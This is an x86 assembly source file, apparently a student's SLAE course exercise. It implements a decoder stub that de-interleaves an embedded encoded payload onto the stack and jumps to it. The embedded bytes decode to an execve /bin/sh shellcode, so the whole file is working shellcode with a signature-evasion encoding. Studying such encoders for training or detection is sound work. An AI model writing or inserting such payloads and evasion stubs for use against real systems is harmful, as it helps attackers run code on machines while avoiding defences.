; Marcos Serrano
; program will decode encoded shellcode
; SLAE 1501



global _start

section .text

_start:
	jmp short pop_shellcode

get_shell_len:
	pop esi;                        has address of shellcode        <--------SHELLCODE
	push esi;                       store for much later

	xor ecx, ecx;                   initialize counter of shell size

	jmp short start_count

loop_count:
	inc ecx

start_count:
	mov dword eax, [esi + ecx];     move 4 bytes of shellcode into eax
	mov ebx, 0xefbeadde
	
	cmp eax, ebx

	jne loop_count

decode_setup:     ;                                                     <-----LEN ECX
	xor ebx, ebx
	xor edx, edx

	mov eax, ecx;                  store length for division
	mov bl, 0x02
	div bl

	mov bl, al;                     length of shellcode divided by 2      <-----LEN/2  EBX
	mov dl, ah;                    move remainder for decoder offset

    mov edi, ecx;                  used to check shellcode len  

	xor eax, eax
    mov al, 0x1

    and edi, eax;                  if length of shellcode is odd, ebx = 0x1

    cmp eax, edi;                  if odd, start at middle of shellcode to decode

	jne even_setup

; ESI will keep track of every other byte
; EDI will keep track of original bytes
odd_setup:
	mov edi, esi;                <------------------------- start of shellcode EDI
	add esi, ebx; shellcode + len/2
    inc esi;                                      <----- shellcode + LEN/2 + 1 ESI
	jmp short finish_decode

even_setup:
	mov edi, esi;               <-------------------------- start of shellcode EDI
	add esi, ebx;               <-------------------------- shellcode + LEN/2

; eax and ebx free for temporary use
finish_decode:
	xor eax, eax
	xor ebx, ebx
	xor edx, edx
	mov edx, ecx

original_bytes:
	mov byte bl, [edi]
	mov eax, esp
	sub eax, ecx
	mov byte [eax], bl; write 1 byte of shellcode
	inc edi
	
	loop other_bytes
	jmp short finish

other_bytes:
	mov byte bl, [esi]
	mov eax, esp
	sub eax, ecx
	mov byte [eax], bl; write 1 byte of other bytes
	inc esi

	loop original_bytes
	
finish:
	sub esp, edx
	jmp esp

pop_shellcode:
	call get_shell_len
	shellcode: db 0x31,0x50,0x2f,0x6c,0x68,0x62,0x6e,0xe3,0x89,0x53,0xe1,0x0b,0x80,0xc0,0x68,0x2f,0x73,0x2f,0x69,0x89,0x50,0xe2,0x89,0xb0,0xcd,0xde,0xad,0xbe,0xef
